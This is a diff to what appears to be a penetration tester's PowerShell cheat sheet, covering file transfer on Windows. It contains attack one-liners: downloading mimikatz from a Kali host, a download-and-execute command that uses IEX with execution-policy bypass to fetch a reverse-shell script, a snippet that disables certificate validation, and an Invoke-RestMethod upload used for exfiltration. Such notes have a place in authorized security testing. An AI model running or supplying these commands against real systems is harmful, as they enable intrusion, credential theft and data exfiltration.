@@ -101,7 +101,11 @@ bitsadmin /create JOB & bitsadmin /addfile JOB %TEMP%\test1.txt %TEMP%\test2.txt
 * BEWARE: This does not seem to work if you are to encode the whole command (IEX...). Better to encode payload/command from Windows to see if it gives an error
 
 
-### Download files
+### Download & Uploading files
+* Ignore bad/untrusted/self-signed certificates
+    ```powershell
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+    ```
 * Download only [^1]
     ```powershell
     Invoke-WebRequest "http://<KALI_IP>:8000/mimikatz.zip" -Out mimikatz.zip
@@ -114,6 +118,11 @@ bitsadmin /create JOB & bitsadmin /addfile JOB %TEMP%\test1.txt %TEMP%\test2.txt
 * Download and execute
     ```powershell
     powershell -Exec Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString(`"""http://10.0.1.5:1337/reverse.ps1`""")"
+    ```
+* Uploading files
+    * Setup a [Simple HTTP Server](../Infrastructure_Setup/Simple_Python_Go_Packages.html#projectdiscovery-simplehttpserver) for this command.
+    ```
+    Invoke-RestMethod -Uri $uri -Method Put -InFile $uploadPath -UseDefaultCredentials
     ```
 
 ### cat, tail, grep in Windows PS
